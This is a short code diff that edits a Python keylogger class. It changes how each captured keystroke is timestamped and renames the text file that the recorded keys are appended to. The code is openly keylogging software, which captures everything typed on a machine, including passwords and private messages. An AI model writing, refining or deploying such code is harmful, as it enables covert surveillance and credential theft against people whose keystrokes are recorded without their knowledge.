@@ -22,13 +22,14 @@ class Keylogger:
 
 
     def callback(self, event):
-        now = datetime.now().time()
+
         """
         This callback is invoked whenever a keyboard event is occured
         (i.e when a key is released in this example)
         """
         name = event.name
         eventtype = event.event_type
+        now = event.time
 
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
@@ -62,7 +63,7 @@ class Keylogger:
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
-        self.filename = "log"
+        self.filename = "keylog"
         # open the file in write mode (create it)
         myfile = open(f"{self.filename}.txt", "a")
         # write the keylogs to the file
